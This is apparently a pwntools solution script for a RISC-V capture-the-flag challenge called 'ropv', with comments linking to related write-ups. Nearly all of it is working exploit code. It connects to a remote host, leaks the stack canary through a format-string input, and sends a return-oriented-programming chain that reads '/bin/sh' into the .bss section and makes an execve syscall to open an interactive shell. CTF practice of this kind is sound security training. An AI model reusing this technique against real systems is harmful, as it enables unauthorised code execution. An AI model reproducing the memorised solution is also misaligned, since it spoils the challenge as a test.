# good resource for this chall:
# https://github.com/nobodyisnobody/write-ups/tree/main/nullcon.HackIM.2022/pwn/typical.ROP
# https://infosecwriteups.com/return-oriented-programming-on-risc-v-part-1-dd9817b52d2b

from pwn import *
#io = process("./ropv")
io = remote("139.177.185.41",12335)
elf = ELF("./ropv")

# %9$p to leak canary
io.sendlineafter("Echo server:","%9$p")
canary = int(io.recvline()[:-1],16)


read = p64(elf.symbols["read"]) 
ownBinsh = p64(0x70c48) # .bss section, used readelf -S ropv to find the address
ecall = p64(0x1073c)
setRegs = p64(0x4281a)
loada0 = p64(0x4abf4) # ld a0,24(sp) / ld ra,40(sp) / addi sp,sp,48 / ret

rop  = b"A" * 8 + p64(canary)
rop += p64(0) # rbp
rop += loada0

# load read into a0, and ra (ret register) to setRegs
rop += b"\x00"*24 + read + b"\x00"*8 + setRegs

# load a0 with read arguments, and ra with loada0
# read() into .bss
rop += b"\x00"*8 + p64(0) + ownBinsh + p64(0x100) + b"\x00"*8*4 + p64(221) + loada0 + b"\x00"*8*8

# load ecall into a0, and load ra with setRegs
rop += b"\x00"*24 + ecall + b"\x00"*8 + setRegs

# setup ecall/syscall arguments, then ret to ecall
rop += b"\x00"*8 + ownBinsh + b"\x00"*8*6 + p64(221) + ecall + b"\x00"*8*8

io.sendlineafter("Echo server:",rop)
pause()
io.send("/bin/sh")

io.interactive()

